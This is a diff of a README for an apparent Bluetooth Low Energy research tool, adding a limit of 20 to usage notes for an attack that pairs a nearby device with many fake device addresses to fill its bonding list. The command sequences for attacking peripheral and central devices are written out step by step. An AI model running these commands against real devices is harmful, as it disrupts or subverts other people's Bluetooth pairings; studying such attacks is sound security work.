@@ -25,7 +25,7 @@ bleframework scan start
 // wait until the device's BDA appears (the device must be very close!)
 // then launch the attack
 bleframework ifa <BDA (public|private)> <n> 
-// n specifies with how many fake IDs (fake BDAs) should be paired to fill the device's bonding list
+// n specifies with how many fake IDs (fake BDAs) should be paired to fill the device's bonding list. The maximum is 20.
 ```
 
 If the pairing must be initiated by the user
@@ -35,7 +35,7 @@ bleframework scan start
 // then launch the attack
 // ifa stage 1: initial pairing; pairing with the real ID (BDA); ID 0 
 bleframework ifa1 <BDA (public|private)>
-// call ifa stage 2 n times
+// call ifa stage 2 n times (n max. 20)
 // n specifies with how many fake IDs (fake BDAs) should be paired to fill the device's bonding list
 bleframework ifa2 <BDA (public|private)>
 // ifa stage 3: resetting to initial ID (ID 0)
@@ -53,7 +53,7 @@ The attack on a Central device cannot be conducted automatically, since the conn
 bleframework advertise start
 // when connected
 bleframework ifa1
-// repeat stage 2.1 - 2.2 n times:
+// repeat stage 2.1 - 2.2 n times (n max. 20):
 // ifa stage 2.1: resetting ID to new ID and start advertising
 bleframework ifa2_1_p
 // Central pairs with us
